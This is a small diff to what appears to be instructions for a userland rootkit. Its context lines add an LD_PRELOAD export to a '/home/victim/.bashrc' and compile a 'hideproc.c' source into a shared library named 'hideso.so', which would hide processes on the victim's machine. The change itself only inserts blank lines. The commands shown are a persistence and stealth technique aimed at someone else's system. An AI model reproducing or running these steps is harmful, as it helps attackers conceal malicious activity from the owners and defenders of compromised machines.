@@ -14,6 +14,8 @@ nano /home/victim/.bashrc
 export LD_PRELOAD=/path/to/your/hideso.so
 
 #save and close.
+
+
 #compile hide.c script
 gcc -Wall -fPIC -shared -o hideso.so hideproc.c -ldl
 
